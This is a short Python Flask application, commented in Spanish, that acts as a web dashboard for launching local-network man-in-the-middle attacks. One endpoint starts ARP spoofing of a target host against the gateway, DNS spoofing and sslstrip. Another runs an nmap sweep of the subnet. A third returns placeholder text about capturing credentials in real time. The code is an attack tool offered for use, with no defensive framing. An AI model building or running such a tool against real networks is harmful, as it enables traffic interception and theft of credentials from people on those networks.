from flask import Flask, render_template, jsonify, request
import threading
import os

app = Flask(__name__)

# Función para iniciar los ataques simultáneamente
def start_attacks():
    os.system("arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &")  # Ejemplo ARP spoofing
    os.system("dnsspoof -i eth0 &")
    os.system("sslstrip -l 8080 &")

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/start', methods=["POST"])
def start():
    threading.Thread(target=start_attacks).start()
    return jsonify({"status": "Ataques iniciados correctamente."})

@app.route('/devices', methods=["GET"])
def get_devices():
    # Escaneo básico de dispositivos en la red con Nmap
    devices = os.popen("nmap -sn 192.168.1.0/24 | grep 'Nmap scan report'").read()
    return jsonify({"devices": devices.splitlines()})

@app.route('/output', methods=["GET"])
def get_output():
    # Simular salida de datos interceptados (puede adaptarse a logs reales)
    output = "Interceptando tráfico y capturando credenciales en tiempo real..."
    return jsonify({"output": output})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
